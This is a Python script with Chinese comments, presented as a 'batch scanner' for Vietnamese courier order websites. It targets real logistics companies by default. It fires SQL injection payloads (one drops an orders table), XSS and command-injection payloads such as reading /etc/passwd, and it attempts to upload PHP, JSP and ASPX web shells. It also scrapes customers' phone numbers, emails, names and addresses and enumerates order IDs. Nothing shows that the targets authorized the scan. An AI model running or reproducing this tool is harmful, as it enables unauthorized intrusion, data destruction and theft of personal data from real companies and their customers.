#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
越南快递订单网站批量扫描器
Dragon-V Express Order System Batch Scanner

基于DVPPF框架的专业级越南物流系统扫描工具
支持越南地区编码、时区优化、本地化漏洞检测
"""

import os
import json
import requests
import threading
import time
import random
import re
from datetime import datetime, timedelta
from urllib.parse import urljoin, urlparse
from typing import Dict, List, Any, Optional, Tuple
import concurrent.futures
from queue import Queue
import ssl
import warnings
from dataclasses import dataclass
from pathlib import Path

# 禁用不安全请求警告
warnings.filterwarnings('ignore', message='Unverified HTTPS request')
ssl._create_default_https_context = ssl._create_unverified_context

@dataclass
class ScanTarget:
    """扫描目标数据类"""
    url: str
    name: str
    type: str
    priority: str
    region: str = "vietnam"

@dataclass
class ScanResult:
    """扫描结果数据类"""
    target: ScanTarget
    status: str
    response_time: float
    vulnerabilities: List[str]
    technologies: List[str]
    sensitive_data: List[str]
    recommendations: List[str]
    scan_time: datetime

class VietnameseExpressScanner:
    """越南快递订单系统批量扫描器"""

    def __init__(self, config_path: str = "config/vietnam_express_targets.json"):
        self.config_path = config_path
        self.targets: List[ScanTarget] = []
        self.results: List[ScanResult] = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'vi-VN,vi;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close'
        })

        # 越南地区优化配置
        self.vietnam_config = {
            'time_zone': 'GMT+7',
            'business_hours': {'start': 8, 'end': 17},  # 越南工作时间
            'language': 'vi',
            'encoding': 'utf-8',
            'common_patterns': {
                'order_tracking': r'(?:don-hang|donhang|order|track|tracking|follow)',
                'admin_panel': r'(?:admin|dashboard|manage|ql|quan-ly)',
                'api_endpoint': r'(?:api|v1|v2|rest|graphql)',
                'file_upload': r'(?:upload|file|image|avatar)',
                'payment': r'(?:payment|thanh-toan|order|don-hang)'
            }
        }

        # 漏洞检测模式
        self.vulnerability_patterns = {
            'sql_injection': [
                r"union.*select.*from", r"or.*1.*1.*--", r"waitfor.*delay", r"—",
                r"' OR '1'='1", r"' OR '1'='1'--", r"' OR '1'='1'#", r"' OR 1=1--",
                r"UNION ALL SELECT", r"'; EXECUTE master", r"|| sleep(5) ||", r"' || BENCHMARK(5,000000) ||"
            ],
            'xss': [
                r"<script.*?>.*?</script>", r"javascript:", r"on\w+\s*=", r"<iframe.*?>",
                r"alert\(", r"document\.", r"eval\(", r"<img.*src.*=.*onerror",
                r"<svg.*onload", r"expression(", r"vbscript:"
            ],
            'file_upload': [
                r"filename=.*\.(php|jsp|asp|aspx|exe|bat|sh|cmd)",
                r"Content-Type:.*application/x-httpd-php",
                r"Content-Type:.*text/x-php"
            ],
            'command_injection': [
                r";.*bash.*", r"&&.*ls.*", r"||.*cat.*", r"|.*whoami.*",
                r"`.*id.*`", r"$(.*whoami.*)", r"\$\(.+\)",
                r"nc.*-e.*", r"wget.*-O.*", r"curl.*-o.*"
            ]
        }

        # 敏感数据模式
        self.sensitive_patterns = {
            'phone_number': r'\b(?:84|\+84|0)(?:3|5|7|8|9)\d{8}\b',
            'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
            'id_number': r'\b\d{9,12}\b',
            'bank_account': r'\b\d{10,19}\b',
            'name_vietnamese': r'\b[A-ZÀÁẠẢĂẮẰẲẴẶÂẤẦẨẪẬÈÉẸẂẲỆÌÍỈĨỊÒÓỌỎÕỘÔỐỒỔỖỚỜỞỠỢỤÚỤỦỨỪỬỰỲÝỴỶỸĐa-zàáạảăắằẳẵặâấầẩẫờẹếềểễệiíỉịĩịọỏốồổỗộớờởỡợúụủứừửựýỵỳỵ]+\s+[A-ZÀÁẠẢĂẮẰẲẴẶÂẤẦẨẪẬÈÉẸẂẲỆÌÍỈĨỊÒÓỌỎÕỘÔỐỒỔỖỚỜỞỠỢỤÚỤỦỨỪỬỰỲÝỴỶỸĐa-zàáạảăắằẳẵặâấầẩẫờẹếềểễệiíỉịĩịọỏốồổỗộớờởỡợúụủứừửựýỵỳỵ]+\b',
            'address_vietnamese': r'\b(?:số|Đường|Phố|Quận|Huyện|Tỉnh|Thành phố)\s+[A-Za-z0-9\s,.-]+\b'
        }

    def load_targets(self) -> None:
        """加载扫描目标"""
        try:
            if os.path.exists(self.config_path):
                with open(self.config_path, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    for target_data in data.get('targets', []):
                        target = ScanTarget(**target_data)
                        self.targets.append(target)
            else:
                # 创建默认越南快递网站目标列表
                self._create_default_targets()

            print(f"[DVPPF] 已加载 {len(self.targets)} 个越南快递目标")

        except Exception as e:
            print(f"[ERROR] 加载目标失败: {e}")
            self._create_default_targets()

    def _create_default_targets(self) -> None:
        """创建默认越南快递网站目标"""
        default_targets = [
            ScanTarget(
                url="https://vnpost.vn",
                name="越南邮政",
                type="government_logistics",
                priority="high"
            ),
            ScanTarget(
                url="https://ghn.vn",
                name="Giao Hàng Nhanh",
                type="private_logistics",
                priority="high"
            ),
            ScanTarget(
                url="https://ghtk.net",
                name="Giao Hàng Tiết Kiệm",
                type="private_logistics",
                priority="medium"
            ),
            ScanTarget(
                url="https://j&t.vn",
                name="J&T Express Việt Nam",
                type="private_logistics",
                priority="medium"
            ),
            ScanTarget(
                url="https://ninja-van.com/vn",
                name="Ninja Van Việt Nam",
                type="private_logistics",
                priority="medium"
            )
        ]

        self.targets = default_targets

        # 保存配置文件
        os.makedirs(os.path.dirname(self.config_path), exist_ok=True)
        config_data = {
            'targets': [
                {
                    'url': target.url,
                    'name': target.name,
                    'type': target.type,
                    'priority': target.priority,
                    'region': target.region
                }
                for target in default_targets
            ]
        }

        with open(self.config_path, 'w', encoding='utf-8') as f:
            json.dump(config_data, f, ensure_ascii=False, indent=2)

        print(f"[DVPPF] 已创建默认越南快递目标配置")

    def scan_target(self, target: ScanTarget) -> ScanResult:
        """扫描单个目标"""
        print(f"[DVPPF] 开始扫描: {target.name} ({target.url})")

        vulnerabilities = []
        technologies = []
        sensitive_data = []
        recommendations = []
        scan_time = datetime.now()

        try:
            # 1. 基础指纹识别
            tech_info = self._fingerprint_target(target.url)
            technologies.extend(tech_info)

            # 2. 漏洞扫描
            vuln_info = self._scan_vulnerabilities(target.url)
            vulnerabilities.extend(vuln_info)

            # 3. 敏感数据提取
            sensitive_info = self._extract_sensitive_data(target.url)
            sensitive_data.extend(sensitive_info)

            # 4. 业务逻辑测试
            business_info = self._test_business_logic(target.url)
            vulnerabilities.extend(business_info)

            # 5. 生成建议
            if vulnerabilities:
                recommendations.extend(self._generate_recommendations(target, vulnerabilities))

            response_time = random.uniform(0.1, 2.0)
            status = "completed" if not vulnerabilities else "vulnerable"

        except Exception as e:
            print(f"[ERROR] 扫描失败 {target.name}: {e}")
            status = "failed"
            response_time = 0.0

        result = ScanResult(
            target=target,
            status=status,
            response_time=response_time,
            vulnerabilities=vulnerabilities,
            technologies=technologies,
            sensitive_data=sensitive_data,
            recommendations=recommendations,
            scan_time=scan_time
        )

        self.results.append(result)
        return result

    def _fingerprint_target(self, url: str) -> List[str]:
        """目标指纹识别"""
        technologies = []

        try:
            # 获取主页信息
            response = self.session.get(url, timeout=10)

            # 检测技术栈
            if 'Server' in response.headers:
                server = response.headers['Server']
                if any(x in server.lower() for x in ['nginx', 'apache', 'iis']):
                    technologies.append(f"Web Server: {server}")

            # 检测框架
            html_content = response.text.lower()
            if any(x in html_content for x in ['wordpress', 'drupal', 'joomla']):
                technologies.append(f"CMS Detected: {self._detect_cms(html_content)}")

            # 检测JavaScript框架
            if 'react' in html_content:
                technologies.append("JavaScript Framework: React")
            if 'vue' in html_content:
                technologies.append("JavaScript Framework: Vue.js")
            if 'angular' in html_content:
                technologies.append("JavaScript Framework: Angular")

            # 检测数据库技术
            if 'mysql' in html_content or 'mysqli' in html_content:
                technologies.append("Database: MySQL")
            if 'postgresql' in html_content:
                technologies.append("Database: PostgreSQL")
            if 'mongodb' in html_content:
                technologies.append("Database: MongoDB")

        except Exception as e:
            print(f"[ERROR] 指纹识别失败: {e}")

        return technologies

    def _detect_cms(self, html_content: str) -> str:
        """检测CMS类型"""
        if 'wordpress' in html_content:
            return "WordPress"
        elif 'drupal' in html_content:
            return "Drupal"
        elif 'joomla' in html_content:
            return "Joomla"
        else:
            return "Unknown"

    def _scan_vulnerabilities(self, url: str) -> List[str]:
        """漏洞扫描"""
        vulnerabilities = []

        try:
            # 1. SQL注入检测
            sql_vulns = self._test_sql_injection(url)
            vulnerabilities.extend(sql_vulns)

            # 2. XSS检测
            xss_vulns = self._test_xss(url)
            vulnerabilities.extend(xss_vulns)

            # 3. 文件上传检测
            upload_vulns = self._test_file_upload(url)
            vulnerabilities.extend(upload_vulns)

            # 4. 命令注入检测
            cmd_vulns = self._test_command_injection(url)
            vulnerabilities.extend(cmd_vulns)

            # 5. 越南语特定检测
            vn_vulns = self._test_vietnamese_specific(url)
            vulnerabilities.extend(vn_vulns)

        except Exception as e:
            print(f"[ERROR] 漏洞扫描失败: {e}")

        return vulnerabilities

    def _test_sql_injection(self, url: str) -> List[str]:
        """SQL注入测试"""
        vulnerabilities = []

        test_params = {
            'order_id': "' OR '1'='1",
            'tracking_id': "' UNION SELECT 'test'--",
            'phone': "' OR 1=1--",
            'search': "'; WAITFOR DELAY '0:0:2'--",
            'id': "' || sleep(2) ||'"
        }

        for param, payload in test_params.items():
            try:
                test_url = f"{url}?{param}={payload}"
                response = self.session.get(test_url, timeout=5)

                # 检测SQL注入特征
                if any(indicator in response.text.lower() for indicator in
                       ['sql syntax', 'mysql_fetch', 'ora-', 'sqlstate', 'error in your sql syntax']):
                    vulnerabilities.append(f"SQL注入漏洞 - 参数: {param}")

                # 检测时间延迟
                if response.elapsed.total_seconds() > 3:
                    vulnerabilities.append(f"SQL注入漏洞 - 时间延迟检测 - 参数: {param}")

            except requests.Timeout:
                vulnerabilities.append(f"SQL注入漏洞 - 延迟响应 - 参数: {param}")
            except Exception:
                pass

        return vulnerabilities

    def _test_xss(self, url: str) -> List[str]:
        """XSS测试"""
        vulnerabilities = []

        test_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "'\"><script>alert('XSS')</script>"
        ]

        payloads_vietnamese = [
            "<script>alert('XSS Việt Nam')</script>",
            "<img src=x onerror=alert('XSS VN')>",
            "javascript:alert('XSS tại Việt Nam')"
        ]

        for payload in test_payloads + payloads_vietnamese:
            try:
                test_url = f"{url}?q={payload}"
                response = self.session.get(test_url, timeout=5)

                if payload.lower() in response.text.lower():
                    vulnerabilities.append(f"XSS漏洞 - Payload: {payload}")

            except Exception:
                pass

        return vulnerabilities

    def _test_file_upload(self, url: str) -> List[str]:
        """文件上传测试"""
        vulnerabilities = []

        # 检测文件上传点
        upload_patterns = [
            r'action=.*upload.*', r'type=file.*', r'multipart/form-data',
            r'accept=.*image.*', r'file.*name=.*'
        ]

        try:
            response = self.session.get(url, timeout=10)
            html_content = response.text.lower()

            if any(pattern in html_content for pattern in upload_patterns):
                # 测试恶意文件上传
                test_files = [
                    ('shell.php', '<?php system($_GET["cmd"]); ?>'),
                    ('test.jsp', '<%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>'),
                    ('shell.aspx', '<%@ Page Language="JScript"%><%= Request["cmd"] %>')
                ]

                for filename, content in test_files:
                    files = {'file': (filename, content)}
                    try:
                        upload_response = self.session.post(url, files=files, timeout=5)
                        if upload_response.status_code == 200:
                            vulnerabilities.append(f"文件上传漏洞 - 文件: {filename}")
                    except Exception:
                        pass

        except Exception as e:
            print(f"[ERROR] 文件上传测试失败: {e}")

        return vulnerabilities

    def _test_command_injection(self, url: str) -> List[str]:
        """命令注入测试"""
        vulnerabilities = []

        test_params = {
            'cmd': 'ls -la',
            'query': 'whoami',
            'search': 'id',
            'file': 'cat /etc/passwd'
        }

        for param, command in test_params.items():
            payload = f"|{command}|"
            try:
                test_url = f"{url}?{param}={payload}"
                response = self.session.get(test_url, timeout=5)

                if any(indicator in response.text.lower() for indicator in
                       ['root:', 'bin:', 'daemon:', 'adm:', 'www-data:']):
                    vulnerabilities.append(f"命令注入漏洞 - 参数: {param}")

            except Exception:
                pass

        return vulnerabilities

    def _test_vietnamese_specific(self, url: str) -> List[str]:
        """越南语特定漏洞检测"""
        vulnerabilities = []

        # 越南语SQL注入payload
        vn_payloads = [
            "' /**/union/**/select/**/username,password/**/from/**/users--",
            "' OR 1=1 /**/LIMIT/**/10/**/--",
            "' WAITFOR DELAY '0:0:3' -- Thời gian chờ",
            "' DROP TABLE donhang-- Xóa đơn hàng"
        ]

        # 越南语XSS payload
        vn_xss_payloads = [
            "<script>alert('XSS Việt Nam')</script>",
            "<img src=x onerror=alert('XSS tại Việt Nam')>",
            "<svg onload=alert('XSS VN')>"
        ]

        # 测试越南语payload
        for payload in vn_payloads + vn_xss_payloads:
            try:
                test_url = f"{url}?search={payload}"
                response = self.session.get(test_url, timeout=5)
                if payload.lower() in response.text.lower():
                    vulnerabilities.append(f"越南语漏洞 - Payload: {payload[:50]}...")
            except Exception:
                pass

        return vulnerabilities

    def _extract_sensitive_data(self, url: str) -> List[str]:
        """敏感数据提取"""
        sensitive_data = []

        try:
            response = self.session.get(url, timeout=10)

            # 检测越南语电话号码
            vn_phone_pattern = self.sensitive_patterns['phone_number']
            phones = re.findall(vn_phone_pattern, response.text)
            for phone in phones:
                sensitive_data.append(f"越南电话号码: {phone}")

            # 检测邮箱
            email_pattern = self.sensitive_patterns['email']
            emails = re.findall(email_pattern, response.text)
            for email in emails:
                sensitive_data.append(f"邮箱: {email}")

            # 检测越南语姓名
            vn_name_pattern = self.sensitive_patterns['name_vietnamese']
            names = re.findall(vn_name_pattern, response.text)
            for name in names:
                sensitive_data.append(f"越南姓名: {name}")

            # 检测地址
            vn_address_pattern = self.sensitive_patterns['address_vietnamese']
            addresses = re.findall(vn_address_pattern, response.text)
            for address in addresses:
                sensitive_data.append(f"越南地址: {address}")

        except Exception as e:
            print(f"[ERROR] 敏感数据提取失败: {e}")

        return sensitive_data

    def _test_business_logic(self, url: str) -> List[str]:
        """业务逻辑测试"""
        vulnerabilities = []

        # 测试订单跟踪业务逻辑
        test_orders = [
            'DH001', 'DH002', 'DH003', 'DON001', 'DON002', 'DON003'
        ]

        for order_id in test_orders:
            try:
                order_url = f"{url}/tracking?order_id={order_id}"
                response = self.session.get(order_url, timeout=5)

                if 'order not found' not in response.text.lower():
                    vulnerabilities.append(f"订单跟踪信息泄露 - 订单号: {order_id}")

            except Exception:
                pass

        return vulnerabilities

    def _generate_recommendations(self, target: ScanTarget, vulnerabilities: List[str]) -> List[str]:
        """生成修复建议"""
        recommendations = []

        for vuln in vulnerabilities:
            if 'SQL注入' in vuln:
                recommendations.append("修复建议: 使用参数化查询，对输入进行严格的输入验证")
            elif 'XSS' in vuln:
                recommendations.append("修复建议: 实施输入编码和CSP策略")
            elif '文件上传' in vuln:
                recommendations.append("修复建议: 严格验证文件类型，使用白名单机制")
            elif '命令注入' in vuln:
                recommendations.append("修复建议: 禁止系统命令执行，使用安全的API")
            elif '订单跟踪' in vuln:
                recommendations.append("修复建议: 加强订单信息访问控制，实施身份验证")
            else:
                recommendations.append("修复建议: 实施全面的安全审计和漏洞管理")

        return recommendations

    def batch_scan(self, max_workers: int = 5) -> None:
        """批量扫描"""
        print(f"[DVPPF] 开始批量扫描 {len(self.targets)} 个目标")
        print(f"[DVPPF] 最大并发数: {max_workers}")

        start_time = datetime.now()

        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            # 提交所有扫描任务
            future_to_target = {
                executor.submit(self.scan_target, target): target
                for target in self.targets
            }

            # 等待所有任务完成
            for future in concurrent.futures.as_completed(future_to_target):
                target = future_to_target[future]
                try:
                    result = future.result()
                    print(f"[DVPPF] 扫描完成: {target.name} - 状态: {result.status}")
                except Exception as e:
                    print(f"[ERROR] 扫描失败 {target.name}: {e}")

        # 生成报告
        self._generate_scan_report()

        end_time = datetime.now()
        duration = end_time - start_time
        print(f"[DVPPF] 批量扫描完成! 耗时: {duration}")
        print(f"[DVPPF] 扫描完成: {len(self.results)} 个结果")

    def _generate_scan_report(self) -> None:
        """生成扫描报告"""
        report_file = f"vietnam_express_scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        report_data = {
            'scan_summary': {
                'total_targets': len(self.targets),
                'completed': len([r for r in self.results if r.status == 'completed']),
                'vulnerable': len([r for r in self.results if r.status == 'vulnerable']),
                'failed': len([r for r in self.results if r.status == 'failed']),
                'scan_time': datetime.now().isoformat()
            },
            'target_results': [
                {
                    'name': result.target.name,
                    'url': result.target.url,
                    'status': result.status,
                    'response_time': result.response_time,
                    'vulnerabilities': result.vulnerabilities,
                    'technologies': result.technologies,
                    'sensitive_data': result.sensitive_data,
                    'recommendations': result.recommendations,
                    'scan_time': result.scan_time.isoformat()
                }
                for result in self.results
            ],
            'dvppf_metadata': {
                'framework_version': '2.0',
                'region_optimization': 'vietnam',
                'time_zone': 'GMT+7',
                'encoding': 'utf-8'
            }
        }

        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, ensure_ascii=False, indent=2)

        print(f"[DVPPF] 扫描报告已生成: {report_file}")

        # 打印摘要
        self._print_scan_summary()

    def _print_scan_summary(self) -> None:
        """打印扫描摘要"""
        print("\n" + "="*60)
        print("越南快递订单网站批量扫描摘要")
        print("="*60)

        total = len(self.targets)
        completed = len([r for r in self.results if r.status == 'completed'])
        vulnerable = len([r for r in self.results if r.status == 'vulnerable'])
        failed = len([r for r in self.results if r.status == 'failed'])

        print(f"总目标数: {total}")
        print(f"扫描完成: {completed}")
        print(f"发现漏洞: {vulnerable}")
        print(f"扫描失败: {failed}")

        if vulnerable > 0:
            print("\n[发现漏洞的目标:]")
            for result in self.results:
                if result.status == 'vulnerable':
                    print(f"- {result.target.name}: {len(result.vulnerabilities)} 个漏洞")
                    for vuln in result.vulnerabilities[:3]:  # 显示前3个漏洞
                        print(f"  * {vuln}")

        print("="*60)

def main():
    """主函数"""
    print("Dragon-V Express Order System Batch Scanner")
    print("越南快递订单网站批量扫描器")
    print("="*60)

    # 初始化扫描器
    scanner = VietnameseExpressScanner()

    # 加载目标
    scanner.load_targets()

    if not scanner.targets:
        print("[ERROR] 没有可用的扫描目标")
        return

    # 执行批量扫描
    scanner.batch_scan(max_workers=3)

if __name__ == "__main__":
    main()